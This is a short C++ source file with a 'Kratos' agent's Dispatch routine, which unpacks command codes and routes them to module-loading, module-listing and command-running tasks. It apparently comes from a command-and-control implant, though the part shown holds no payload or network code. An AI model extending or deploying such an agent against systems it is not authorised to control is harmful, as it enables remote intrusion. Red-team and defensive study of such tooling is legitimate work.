#include "agent/core.h"
#include "packager/packager.h"
#include "modules/modules.h"

BOOL Kratos::Dispatch( INT32 TotalTasks ) {
	DEBUG_LOG("[+] Dispatching!");
	packager->Pack4( TotalTasks );
	DEBUG_LOG("[+] Packed Total Tasks");

	for(int i = 0; i < TotalTasks; i++) {
		auto CommandCode = packager->UnPack4( );

		DEBUG_LOG("[+] Got Command Code!");

		if ( CommandCode < 0 ) {
			break;
		}

		switch ( CommandCode ) {
			case TASK_LOAD_MODULE:
				DEBUG_LOG("[+] Task = LOAD_MODULE");
				this->moduleLoad( );
				break;
			case TASK_LIST_MODULES:
				this->moduleList( );
				break;
			case TASK_RUN_CMD:
				this->runModuleCmd( );
				break;

		}
	}
	return TRUE;
}